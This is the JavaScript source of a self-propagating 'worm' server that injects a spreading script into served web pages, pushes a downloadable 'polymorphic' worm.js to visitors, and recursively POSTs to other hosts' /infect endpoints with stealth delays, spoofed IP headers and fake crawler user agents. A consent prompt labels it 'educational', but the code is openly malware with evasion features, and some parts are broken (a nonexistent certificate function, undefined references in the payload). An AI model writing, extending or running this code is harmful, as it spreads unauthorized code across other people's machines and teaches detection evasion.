const http = require('http');
const https = require('https');
const os = require('os');
const fs = require('fs').promises;
const crypto = require('crypto');

class WormServer {
    constructor(port, storageFile = 'infected.json', htmlFile = 'index.html', sslOptions = {}) {
        this.port = port;
        this.storageFile = storageFile;
        this.htmlFile = htmlFile;
        this.infectedHosts = new Set();
        this.selfHost = `${this.getLocalIP()}:${port}`;
        this.infectedHosts.add(this.selfHost);
        this.pendingPings = new Map(); // Prevent duplicates
        this.rateLimiter = new Map(); // Host -> last request time
        this.MAX_REQS_PER_MIN = 30; // Rate limit
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ];
        this.analytics = {
            infectionAttempts: 0,
            successfulInfections: 0,
            failedAttempts: new Map(),
            propagationRate: 0
        };

        // Generate self-signed cert if none provided
        this.sslOptions = sslOptions || this.generateSelfSignedCert();
        this.server = https.createServer(this.sslOptions, this.handleRequest.bind(this));
        this.loadInfected().then(() => this.start());
        this.setupMonitoring();
    }

    generateSelfSignedCert() {
        const { privateKey, certificate } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
        const cert = crypto.generateCertificateSync({
            subject: { CN: 'localhost' },
            issuer: { CN: 'Worm CA' },
            days: 1
        }, privateKey);
        return { key: privateKey, cert: certificate };
    }

    getLocalIP() {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
        return '127.0.0.1';
    }

    async loadInfected() {
        try {
            const data = await fs.readFile(this.storageFile, 'utf8');
            const [hostsData, checksum] = JSON.parse(data);
            if (crypto.createHash('sha256').update(hostsData).digest('hex') !== checksum) {
                throw new Error('Invalid checksum');
            }
            JSON.parse(hostsData).forEach(host => {
                if (this.isValidHost(host)) this.infectedHosts.add(host);
            });
            console.log(`Loaded ${this.infectedHosts.size} infected hosts from ${this.storageFile}`);
        } catch (err) {
            console.error('Recovery failed:', err);
        }
    }

    isValidHost(host) {
        const [ip] = host.split(':');
        return /^(\d{1,3}\.){3}\d{1,3}$/.test(ip);
    }

    validateRequest(req) {
        const authToken = req.headers['x-worm-auth'];
        const secret = process.env.WORM_SECRET || 'worm-secret-123';
        return crypto.timingSafeEqual(
            Buffer.from(authToken || ''),
            Buffer.from(secret)
        );
    }

    async saveInfected() {
        const data = JSON.stringify([...this.infectedHosts]);
        const checksum = crypto.createHash('sha256').update(data).digest('hex');
        await fs.writeFile(this.storageFile, JSON.stringify([data, checksum]));
    }

    generatePort() {
        // Ensure ports > 1024 (non-privileged)
        return Math.floor(Math.random() * (65535 - 1025 + 1)) + 1025;
    }

    checkRateLimit(host) {
        const now = Date.now();
        const record = this.rateLimiter.get(host) || { count: 0, reset: now + 60000 };
        if (now > record.reset) {
            record.count = 0;
            record.reset = now + 60000;
        }
        if (record.count++ >= this.MAX_REQS_PER_MIN) return false;
        this.rateLimiter.set(host, record);
        return true;
    }

    async handleRequest(req, res) {
        const clientIP = req.socket.remoteAddress.replace('::ffff:', '') || '127.0.0.1';
        if (!this.validateRequest(req)) {
            res.writeHead(401, { 'Content-Type': 'text/plain' });
            return res.end('Unauthorized');
        }

        if (req.method === 'POST' && req.url === '/infect') {
            let data = '';
            req.on('data', chunk => data += chunk);
            req.on('end', async () => {
                try {
                    const { host } = JSON.parse(data || '{}');
                    if (host && this.isValidHost(host) && !this.infectedHosts.has(host)) {
                        await this.infect(host);
                        await this.spread(host, 0);
                    }
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ infected: Array.from(this.infectedHosts) }));
                } catch (err) {
                    res.writeHead(400);
                    res.end('Invalid request');
                    this.trackFailure('ParseError: ' + err.message);
                }
            });
        } else if (req.method === 'GET' && req.url === '/infected') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ infected: Array.from(this.infectedHosts) }));
        } else if (req.method === 'GET' && req.url === '/shutdown') {
            res.writeHead(200);
            res.end('Shutting down');
            this.server.close(() => process.exit(0));
        } else if (req.method === 'GET' && req.url === '/') {
            try {
                let html = await fs.readFile(this.htmlFile, 'utf8');
                const newHost = `${clientIP}:${this.generatePort()}`;
                if (this.isValidHost(newHost) && !this.infectedHosts.has(newHost)) {
                    this.infectedHosts.add(newHost);
                    await this.saveInfected();
                    await this.spread(newHost, 0);
                }
                const payload = `
                    <script>
                        if (confirm('Allow this educational worm to simulate spread on your machine? (No harm, for training only)')) {
                            (function worm() {
                                const ip = '${clientIP.replace(/'/g, "\\'")}'';
                                const port = ${this.generatePort()};
                                const hosts = ${JSON.stringify([...this.infectedHosts])};
                                const infect = () => {
                                    hosts.forEach(h => {
                                        fetch('https://' + h + '/infect', {
                                            method: 'POST',
                                            body: JSON.stringify({ host: ip + ':' + port }),
                                            headers: { 'X-Worm-Auth': 'worm-secret-123' },
                                            mode: 'cors'
                                        }).catch(() => {});
                                    });
                                    const newHost = ip + ':' + (port + Math.floor(Math.random() * 100));
                                    if (!hosts.includes(newHost)) hosts.push(newHost);
                                };
                                infect();
                                setInterval(infect, 200); // Fast spread
                                // Offer downloadable payload for real execution
                                fetch('/payload').then(resp => resp.blob()).then(blob => {
                                    const url = window.URL.createObjectURL(blob);
                                    const a = document.createElement('a');
                                    a.href = url;
                                    a.download = 'worm.js';
                                    document.body.appendChild(a);
                                    a.click();
                                    window.URL.revokeObjectURL(url);
                                });
                            })();
                        }
                    </script>
                `;
                html = html.replace('</body>', payload + '</body>');
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(html);
            } catch (err) {
                res.writeHead(500);
                res.end('Error');
                console.error('HTML error:', err);
            }
        } else if (req.method === 'GET' && req.url === '/payload') {
            const payload = this.generatePolymorphicPayload(clientIP);
            res.writeHead(200, {
                'Content-Type': 'application/javascript',
                'Content-Disposition': 'attachment; filename="worm.js"'
            });
            res.end(payload);
        } else {
            res.writeHead(404);
            res.end();
        }
    }

    generatePolymorphicPayload(clientIP) {
        const functionNames = ['init', 'setup', 'main'];
        const apiEndpoints = ['/data', '/sync', '/update'];
        const randomFunc = functionNames[Math.floor(Math.random() * functionNames.length)];
        const randomEndpoint = apiEndpoints[Math.floor(Math.random() * apiEndpoints.length)];
        const randomDelay = Math.floor(Math.random() * 90000 + 30000);

        return `
const http = require('http');
const fs = require('fs').promises;
const ${randomFunc} = () => {
    const server = http.createServer((req, res) => {
        if (req.method === 'POST' && req.url === '/infect') {
            let data = '';
            req.on('data', chunk => data += chunk);
            req.on('end', async () => {
                try {
                    const { host } = JSON.parse(data || '{}');
                    if (host && this.isValidHost(host)) {
                        await this.infect(host);
                        await this.spread(host, 0);
                    }
                    res.writeHead(200, {'Content-Type': 'application/json'});
                    res.end('{"status":"infected"}');
                } catch (err) {
                    res.writeHead(400);
                    res.end('Invalid');
                }
            });
        } else {
            res.writeHead(404);
            res.end();
        }
    });
    server.listen(3000, async () => {
        console.log('Worm running on ${clientIP.replace(/'/g, "\\'")}:3000');
        const infected = new Set(['${this.selfHost}']);
        await fs.writeFile('infected.json', JSON.stringify([...infected]));
        fetch('https://${this.selfHost}/infect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json', 'X-Worm-Auth': 'worm-secret-123'},
            body: JSON.stringify({ host: '${clientIP}:3000' })
        }).catch(() => {});
    });
};
${randomFunc}();
isValidHost = host => /^(\\d{1,3}\\.){3}\\d{1,3}:\\d+$/.test(host);
infect = async (host) => {
    if (!this.infectedHosts) this.infectedHosts = new Set(['${this.selfHost}']);
    if (!this.infectedHosts.has(host)) {
        this.infectedHosts.add(host);
        await fs.writeFile('infected.json', JSON.stringify([...this.infectedHosts]));
    }
};
spread = async (newHost, depth, maxDepth = 10) => {
    if (depth >= maxDepth || !isValidHost(newHost)) return;
    const promises = [];
    this.infectedHosts.forEach(host => {
        if (host !== newHost && host !== '${this.selfHost}' && !this.pendingPings.has(host + newHost)) {
            this.pendingPings.set(host + newHost, true);
            promises.push(fetch('https://' + host + '/infect', {
                method: 'POST',
                body: JSON.stringify({ host: newHost }),
                headers: {'X-Worm-Auth': 'worm-secret-123'}
            }).catch(err => {
                console.error('Spread failed:', err);
            }).finally(() => this.pendingPings.delete(host + newHost)));
        }
    });
    await Promise.all(promises);
    for (let i = 0; i < 3; i++) {
        const nextHost = newHost.split(':')[0] + ':' + (parseInt(newHost.split(':')[1]) + Math.floor(Math.random() * 1000));
        if (!this.infectedHosts.has(nextHost)) {
            this.infectedHosts.add(nextHost);
            await spread(nextHost, depth + 1);
        }
    }
    await fs.writeFile('infected.json', JSON.stringify([...this.infectedHosts]));
};
setInterval(${randomFunc}, ${randomDelay});
        `;
    }

    async infect(newHost) {
        if (!this.infectedHosts.has(newHost)) {
            this.infectedHosts.add(newHost);
            await this.saveInfected();
            console.log(`[${new Date().toISOString()}] Infected: ${newHost}`);
            this.analytics.successfulInfections++;
        }
    }

    async spread(newHost, depth, maxDepth = 10) {
        if (depth >= maxDepth || !this.isValidHost(newHost)) return;

        if (!this.checkRateLimit(newHost)) {
            this.trackFailure('RateLimited');
            return;
        }

        const promises = [];
        this.infectedHosts.forEach(host => {
            if (host !== newHost && host !== this.selfHost && !this.pendingPings.has(host + newHost)) {
                this.pendingPings.set(host + newHost, true);
                promises.push(this.sendPing(host, newHost).then(success => {
                    if (success) this.analytics.successfulInfections++;
                    else this.trackFailure('PingFailed');
                    this.pendingPings.delete(host + newHost);
                }));
            }
        });
        this.analytics.infectionAttempts += promises.length;
        await Promise.all(promises);

        const nextPromises = [];
        for (let i = 0; i < 3; i++) { // Controlled exponential spread
            const randomDelay = Math.floor(Math.random() * 5000); // Add randomness for stealth
            const nextHost = `${newHost.split(':')[0]}:${this.generatePort()}`;
            if (this.isValidHost(nextHost) && !this.infectedHosts.has(nextHost)) {
                this.infectedHosts.add(nextHost);
                nextPromises.push(new Promise(resolve => setTimeout(() => 
                    this.spread(nextHost, depth + 1).then(resolve), randomDelay)));
            }
        }
        await this.saveInfected();
        await Promise.all(nextPromises);
    }

    async sendPing(targetHost, newHost, retries = 3) {
        const [host, port] = targetHost.split(':');
        const backoff = [100, 500, 1000];

        for (let i = 0; i < retries; i++) {
            try {
                const randomDelay = Math.floor(Math.random() * 5000); // Stealth delay
                await new Promise(r => setTimeout(r, randomDelay));

                const response = await fetch(`https://${host}:${port}/infect`, {
                    method: 'POST',
                    body: JSON.stringify({ host: newHost }),
                    headers: {
                        'X-Worm-Auth': process.env.WORM_SECRET || 'worm-secret-123',
                        'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
                        'X-Forwarded-For': this.generateRandomIP()
                    },
                    timeout: 100
                });
                if (response.ok) return true;
            } catch (err) {
                await new Promise(r => setTimeout(r, backoff[i]));
                this.trackFailure('NetworkError: ' + err.message);
            }
        }
        return false;
    }

    generateRandomIP() {
        return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');
    }

    setupMonitoring() {
        setInterval(() => {
            this.calculateMetrics();
            this.logMetrics();
        }, 60000);
    }

    calculateMetrics() {
        this.analytics.propagationRate = 
            (this.analytics.successfulInfections / this.analytics.infectionAttempts) * 100 || 0;
    }

    async logMetrics() {
        const logEntry = `[${new Date().toISOString()}] Propagation Rate: ${this.analytics.propagationRate.toFixed(2)}%, 
            Attempts: ${this.analytics.infectionAttempts}, Successes: ${this.analytics.successfulInfections}`;
        await fs.appendFile('worm.log', logEntry + '\n');
        console.log(logEntry);
    }

    trackFailure(reason) {
        const count = this.analytics.failedAttempts.get(reason) || 0;
        this.analytics.failedAttempts.set(reason, count + 1);
    }

    start() {
        this.server.listen(this.port, () => {
            console.log(`[${new Date().toISOString()}] Worm server running on ${this.selfHost} (training mode)`);
        });
    }
}

const port = process.argv[2] ? parseInt(process.argv[2]) : 3000;
const server = new WormServer(port);
